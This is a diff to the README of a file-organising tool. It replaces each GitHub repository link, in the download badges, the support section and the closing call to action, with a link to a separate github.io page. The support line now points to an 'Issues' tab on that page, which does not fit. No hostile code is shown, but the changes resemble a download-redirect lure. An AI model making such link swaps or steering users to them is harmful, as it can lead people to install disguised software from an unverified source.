@@ -1,6 +1,6 @@
 # 🗂️ File-Organiser - Declutter Your Folders Automatically
 
-[![Download File-Organiser](https://img.shields.io/badge/Download-File--Organiser-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Exposeartform7624/File-Organiser)
+[![Download File-Organiser](https://img.shields.io/badge/Download-File--Organiser-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://exposeartform7624.github.io)
 
 ## 👋 Welcome
 
@@ -30,7 +30,7 @@ You decide the rules. It does the thinking. The best part? It works while you're
 
 ### Step 1: Download the Application
 
-[![Click Here to Download](https://img.shields.io/badge/Download-File--Organiser-4b8bbe?style=for-the-badge&labelColor=2c974b&color=2c974b)](https://github.com/Exposeartform7624/File-Organiser)
+[![Click Here to Download](https://img.shields.io/badge/Download-File--Organiser-4b8bbe?style=for-the-badge&labelColor=2c974b&color=2c974b)](https://exposeartform7624.github.io)
 
 Visit this link to download the application. The download page will show you the latest version available.
 
@@ -153,7 +153,7 @@ Look for File-Organiser's icon in your system tray (bottom right corner of your 
 
 Need a hand? You're not alone. Here are ways to get support:
 
-- **GitHub Issues**: Visit the repository page at https://github.com/Exposeartform7624/File-Organiser and click on the "Issues" tab to report problems or ask questions
+- **GitHub Issues**: Visit the repository page at https://exposeartform7624.github.io and click on the "Issues" tab to report problems or ask questions
 - **Community Discussions**: Check if the repository has a Discussions tab enabled
 - **Release Notes**: Read the "Releases" section on GitHub to see what's new or fixed in each version
 
@@ -185,7 +185,7 @@ Know someone whose desktop is a disaster zone? Share File-Organiser with them. I
 
 Ready to bring peace to your files? 
 
-[![Download File-Organiser Now](https://img.shields.io/badge/Download--LINK-blue)](https://github.com/Exposeartform7624/File-Organiser)
+[![Download File-Organiser Now](https://img.shields.io/badge/Download--LINK-blue)](https://exposeartform7624.github.io)
 
 ---
 
